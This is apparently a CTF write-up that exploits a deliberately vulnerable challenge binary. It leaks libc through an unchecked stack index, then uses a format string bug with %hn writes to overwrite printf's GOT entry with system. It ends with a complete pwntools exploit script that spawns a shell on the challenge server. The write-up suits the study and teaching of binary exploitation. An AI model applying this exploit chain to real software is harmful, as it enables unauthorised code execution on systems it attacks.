---
layout: post
title: "Pwn K17 Huge Binary 1 Writeup"
date: 2026-09-12
categories: [CTF, pwn]
tags: []
hidden: true
---

## TL;DR

This writeup covers the exploitation of `huge-binary-1`, chaining an arbitrary stack read with a format string vulnerability. I used the stack read to leak `__libc_start_main`'s return address and calculate the libc base. Then, I used a format string bug to perform a 16-bit chunked GOT overwrite, replacing `printf` with `system`, and passed `/bin/sh` through a second buffer to get a shell.

## Context and Setup

We were provided with the challenge executable, a Dockerfile specifying the environment, and the author's `libc.so.6`. 

Checking the binary's mitigations dictates the exploit path:

```text
RELRO:      No RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No

```

The lack of RELRO means the Global Offset Table (GOT) is writable. No PIE means GOT addresses are static and known. NX is enabled, meaning we can't execute shellcode on the stack, so we need to rely on existing executable code (like libc).

Looking at Ghidra's decompilation of `main`, the vulnerabilities are immediately obvious:

```c
undefined8 main(void)
{
  char local_118 [128];
  char local_98 [132];
  int local_14;
  undefined8 uStack_10;

  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  printf("Enter an index: ");
  __isoc99_scanf(&DAT_00402019,&local_14);
  printf("Your lucky number is 0x%llx\n",(&uStack_10)[local_14]);
  printf("Enter the first input to be echoed: ");
  __isoc99_scanf("%127s",local_98);
  printf("Enter the second input to be echoed: ");
  __isoc99_scanf("%127s",local_118);
  puts("Echoed output: ");
  printf(local_98);
  printf(local_118);
  return 0;
}

```

We have two distinct bugs:

1. **Arbitrary memory read**: `(&uStack_10)[local_14]` uses an unchecked, user-provided index into the stack.
2. **Format string vulnerability**: `printf(local_98)` and `printf(local_118)` are completely unsanitized, giving us a powerful read/write primitive.

## The Walkthrough: From Dead Ends to a Working Chain

### Step 1: Bypassing ASLR (The right and wrong ways)

My initial assumption was to build a ROP chain to make a raw `syscall` to open and read `/flag`. I ran `ROPgadget --binary ./chal | grep syscall` and it came back empty. The binary is dynamically linked, meaning I didn't need to hunt for a `syscall` gadget in the binary itself. I could just use libc functions if I could redirect execution.

Since there was no RELRO, overwriting a GOT entry was the logical next step.

I first tried to use the out-of-bounds stack read `(&uStack_10)[local_14]` to read the GOT directly and leak an already-resolved libc address. This failed because `local_14` is only a 4-byte integer. The underlying assembly is `rbp + (rax * 8) - 8` (where `rbp` is `uStack_10` and `rax` is `local_14`). The 4-byte index simply couldn't reach the GOT's location in memory.

**The fix:** Instead of reaching for the GOT, I used the index to read upward into the stack to leak the return address of `main`. This address points to an offset inside `__libc_start_main`. By subtracting the known offset of `__libc_start_main` from this leak, I successfully computed the libc base address.

### Step 2: Locating the Format String Buffer

To overwrite `printf`'s GOT entry with `system`'s address using the format string bug, I first needed to know exactly which argument index corresponded to the start of my controlled buffer on the stack.

Instead of guessing, I wrote a quick script to mark the start of the buffer with a recognizable pattern (`0xaa`) and dump the stack pointers:

```python
def make_format_string_mark_args(start, end):
    fmt = b""
    fmt += ctypes.c_uint64(repeat_byte_into_8bytes(0xaa))
    for i in range(start, end):
        fmt += f"({i}):%{i}$p".encode()
    # ... length checks omitted ...
    return fmt[:127]

```

The output revealed the exact offset:

```text
\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa(20):(nil)(21):0x7fc9a572a000(22):(nil)(23):(nil)(24):0xaaaaaaaaaaaaaaaa...

```

The `0xaaaaaaaaaaaaaaaa` pattern appeared at argument `24`. This was the anchor for the write payload.

### Step 3: The GOT Overwrite and the `%hn` Pitfalls

To replace the `printf` GOT entry with `system`, I needed to write a 64-bit address.

Initially, I tried using `%n` to write 32-bit chunks. The upper bound of characters `printf` would have to output to write a large 32-bit address is massive. I pivoted to using `%hn`, which writes 16-bit data chunks.

Writing four 16-bit chunks surfaced a sequence of specific bugs in my exploit logic:

1. **Size constraints:** Because `%hn` writes exactly 2 bytes to the target pointer, asking it to process larger chunks causes `printf` to interpret the lower bytes and corrupt the write.
2. **Sorting by size:** `%hn` writes the *total number of characters printed so far*. You cannot tell `printf` to write a smaller number after a larger one. The four 16-bit chunks of the `system` address must be sorted in ascending numerical order, and you write the *deltas* between them.
3. **ASLR dynamics:** Because libc addresses change on every execution, the sorting of these 16-bit chunks must be calculated dynamically in the exploit script, not hardcoded.
4. **Zero-deltas:** Sometimes two 16-bit chunks are identical. If the delta is 0, no padding characters should be printed, and we must invoke `%hn` directly without a `%c` padding directive.

### Step 4: The NULL Termination Trap

With the dynamic chunking built, the payload still failed against the target. The first `printf` wasn't processing the format directives. No padding characters were being printed.

The root cause was my buffer layout:
`dest_addr, dest_addr+2, dest_addr+4, dest_addr+6, format_string`

`printf` treats its format string argument as a NULL-terminated string. Because I was placing 64-bit addresses (packed as 8 little-endian bytes) at the beginning of the buffer, and almost every real memory address contains a `\x00` byte, `printf` hit the null byte immediately and stopped parsing. The format directives were never even seen.

**The fix:** I reordered the buffer so the ASCII format string came first, padded out to a predictable length (64 bytes) to keep the argument index consistent, and appended the raw addresses at the end.

New layout:
`format_string, (padding 'a's to byte 64), dest_addr, dest_addr+2, dest_addr+4, dest_addr+6`

Because `printf` processes the format string sequentially, it executes all the `%hn` writes before it ever reaches the null bytes in the trailing addresses.

## Final Exploit Script

With the GOT overwritten, the program calls `printf(local_118)`. But because the GOT now points to `system`, this executes `system(local_118)`. By sending `/bin/sh cat /flag` as the second input, we get execution.

![solution demo](/assets/gif/pwn-k17-big-binary-1-solve.gif)

```python
from pwn import *
import ctypes
import struct

libc = ELF("./libc.so.6")
exe = './chal'
elf = ELF(exe)

leak_ret_addr_offset_from_libc = 0x0029ca8
# rbp + (i * 8) - 8 = rbp + 8 (ret addr) so i = 2
leak_ret_addr_offset = b"2"
buffer_start_arg_num_absolute = 24 

def set_libc_base_addr_from_scanf(ret_addr):
    global libc
    global leak_ret_addr_offset_from_libc
    base_libc = ret_addr - leak_ret_addr_offset_from_libc
    libc.address = base_libc

def make_format_string_got_overwrite(qword_to_overwrite, dest_addr):
    global libc
    
    # Split the target address into four 16-bit chunks
    overwrite_addr_u16_1 = qword_to_overwrite & 0xff_ff
    overwrite_addr_u16_2 = (qword_to_overwrite & (0xff_ff << 16)) >> 16
    overwrite_addr_u16_3 = (qword_to_overwrite & (0xff_ff << 32)) >> 32
    overwrite_addr_u16_4 = (qword_to_overwrite & (0xff_ff_ff_ff << 48)) >> 48

    # Store with their positional offsets
    overwrite_list = [(overwrite_addr_u16_1, 0), (overwrite_addr_u16_2, 1), (overwrite_addr_u16_3, 2), (overwrite_addr_u16_4, 3)]
    
    # Sort in place to handle printf's accumulating character count
    overwrite_list.sort(key=lambda tup: tup[0])  

    fmt = b""
    printed = 0
    current_delta = 0

    for overwrite_addr_u16, arg_offset in overwrite_list:
        current_delta = overwrite_addr_u16 - printed
        if current_delta != 0:
            fmt += f"%{1}${current_delta}c".encode()
            
        # Write the chunk. 64//8 accounts for the padding offset.
        fmt += f"%{buffer_start_arg_num_absolute + arg_offset + (64 // 8)}$hn".encode()
        
        printed += current_delta
        printed = printed % 0x1_00_00

    # Pad to exact 64 byte boundary so argument offsets remain static
    fmt += b'a' * (64 - len(fmt))

    # Append the raw addresses last to avoid premature NULL termination
    fmt += struct.pack('P', dest_addr)
    fmt += struct.pack('P', dest_addr + 2)
    fmt += struct.pack('P', dest_addr + 4)
    fmt += struct.pack('P', dest_addr + 6)

    assert(len(fmt) < 127)
    return fmt

io = remote("chal.secso.cc", 4002)

# 1. Leak libc base
io.recvuntil(b'Enter an index: ')
io.sendline(leak_ret_addr_offset) 

io.recvuntil(b"number is ")
ret_addr = int(io.recvline(), 0x10)
set_libc_base_addr_from_scanf(ret_addr)

# 2. Overwrite printf GOT with system
io.recvuntil(b'Enter the first input to be echoed: ')
io.sendline(make_format_string_got_overwrite(libc.symbols['system'], elf.got['printf']))        

# 3. Trigger system() with our payload
io.recvuntil(b'Enter the second input to be echoed: ')
io.sendline(b"/bin/sh cat /flag")        

io.recvline()  # "Echoed output:"
io.settimeout(10)
while True: 
    data = io.recv(4096)
    if not data: 
        break
    print(data.decode())

```

## Takeaways

* **Verify assumptions early:** Several early dead ends (like trying to read the GOT directly via a 4-byte offset) came from trusting an assumption about stack layout or variable types without actually checking the bounds.
* **Data placement matters:** Always place raw addresses at the end of the buffer.

